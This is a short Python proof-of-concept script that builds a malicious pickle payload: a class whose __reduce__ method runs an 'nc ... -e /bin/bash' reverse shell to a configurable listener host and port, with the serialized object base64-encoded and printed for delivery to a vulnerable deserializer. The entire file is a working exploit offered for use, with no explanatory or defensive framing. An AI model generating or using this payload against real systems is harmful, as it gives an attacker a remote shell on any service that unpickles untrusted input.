# PoC for a reverse shell for deserialization

import pickle, os, base64

# change these
LHOST = '127.0.0.1'
LPORT = '1337'

class exploit:
    def __reduce__(self):
        return(os.system, (f'nc {LHOST} {LPORT} -e /bin/bash',) )

serialized = pickle.dumps(exploit())
final = base64.b64encode(serialized)

print(final)
